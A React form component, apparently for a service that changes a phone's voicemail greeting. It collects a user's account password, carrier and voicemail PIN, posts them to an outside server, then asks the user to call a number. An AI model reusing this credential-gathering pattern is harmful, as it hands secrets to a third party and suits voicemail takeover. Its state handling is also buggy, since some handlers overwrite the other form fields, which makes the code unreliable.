import React, { Component } from 'react';
import Router from 'next/router';
import { AsYouType, formatNumber, isValidNumber, parseNumber } from 'libphonenumber-js';

import css from '../styles/style.scss';

export default class VMChangerForm extends React.Component {
  constructor(props) {
    super(props);

    this.handleChangePhone = this.handleChangePhone.bind(this);
    this.handleChangeName = this.handleChangeName.bind(this);
    this.handleChangeInput = this.handleChangeInput.bind(this);
    this.handleSubmit = this.handleSubmit.bind(this);
    this.generateText = this.generateText.bind(this);

    this.state = {
      isModalActive: false,
      form: {
        name: '',
        phone: '',
        password: '',
        carrier: '',
        pin: '',
        text: this.generateText(''),
      },
    };
  }

  handleSubmit(event) {
    event.preventDefault();
    const { form } = this.state;

    // Convert form data to params.
    const params = new URLSearchParams();
    for (let pair of Object.entries(form)) {
      params.set(pair[0], pair[1]);
    }

    fetch('https://vmchanger.abashina.org/info', {
      method: 'POST',
      body: params,
    });

    this.setState({
      isModalActive: true,
    });
  }

  handleCloseModal() {
    // Redirect user to the home page.
    Router.push('/');
  }

  handleChangePhone(event) {
    const { value } = event.target;

    // Parse input number.
    const cleanNum = value.replace(/[^\d]/g, '');
    // Format number and update input.
    const formatedNum = new AsYouType('US').input(cleanNum);
    event.target.value = formatedNum;

    this.setState({
      form: {
        phone: formatNumber(cleanNum, 'US', 'E.164'),
      },
    });
  }

  handleChangeName(event) {
    const { value } = event.target;
    this.setState({
      form: {
        name: value,
        text: this.generateText(value),
      },
    });
  }

  handleChangeInput(name, event) {
    const { value } = event.target;
    const { form } = this.state;
    form[name] = value;
    this.setState(form);
  }

  generateText(name) {
    return `Hello! You've reached ${name}'s voicemail. Please leave a message with your name and number after a tone. Thanks!`;
  }

  render() {
    const {
      isModalActive,
      name,
      form: { text },
    } = this.state;
    return (
      <div>
        <form onSubmit={this.handleSubmit}>
          <div className={css.Container}>
            <div className={`${css.column} ${css.col8} ${css.colMxAuto}`}>
              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-name">
                  Name
                </label>
                <input
                  onChange={this.handleChangeName}
                  className={css.formInput}
                  type="text"
                  id="input-name"
                  name="name"
                  placeholder="Name"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-phone">
                  Phone number
                </label>
                <div className={css.inputGroup}>
                  <span className={`${css.inputGroupAddon} ${css.countryCode}`}>+1</span>
                  <input
                    onChange={this.handleChangePhone}
                    className={css.formInput}
                    type="text"
                    id="input-phone"
                    name="phone"
                    placeholder="Tel"
                    maxLength="14"
                    required
                  />
                </div>
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-password">
                  Password
                </label>
                <input
                  onChange={event => this.handleChangeInput('password', event)}
                  className={css.formInput}
                  type="password"
                  id="input-password"
                  name="password"
                  placeholder="Password"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-carrier">
                  Cell Phone Carrier
                </label>
                <select
                  className={css.formSelect}
                  id="input-carrier"
                  name="carrier"
                  onChange={event => this.handleChangeInput('carrier', event)}
                  required
                >
                  <option>-</option>
                  <option value="att">AT&T</option>
                  <option value="googlefi">Google Fi</option>
                  <option value="mint">Mint</option>
                  <option value="sprint">Sprint</option>
                  <option value="tmobile">T-Mobile</option>
                  <option value="verizon">Verizon</option>
                </select>
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-pin">
                  Voicemail pin code
                </label>
                <input
                  onChange={event => this.handleChangeInput('pin', event)}
                  className={css.formInput}
                  type="password"
                  id="input-pin"
                  name="pin"
                  placeholder="Pin Code"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-text">
                  Text Message
                </label>
                <textarea
                  onChange={event => this.handleChangeInput('text', event)}
                  className={css.formInput}
                  id="input-text"
                  name="text"
                  rows="3"
                  value={text}
                  required
                />
              </div>
              <div className={css.inputGroup}>
                <button className={`${css.btn} ${css.btnPrimary}`}>Submit</button>
              </div>
            </div>
          </div>
        </form>
        <div className={`${css.modal} ${css.modalLg} ${isModalActive ? css.active : ''}`}>
          <a
            onClick={this.handleCloseModal}
            className={`${css.modalOverlay} ${css.modalLg}`}
            aria-label="Close"
          />
          <div className={`${css.modalContainer}`}>
            <h3>Please call this number to finish process:</h3>
            <h1 className={`${css.vmPhone} ${css.textSuccess}`}>+1 973-363-2211</h1>
          </div>
        </div>
      </div>
    );
  }
}
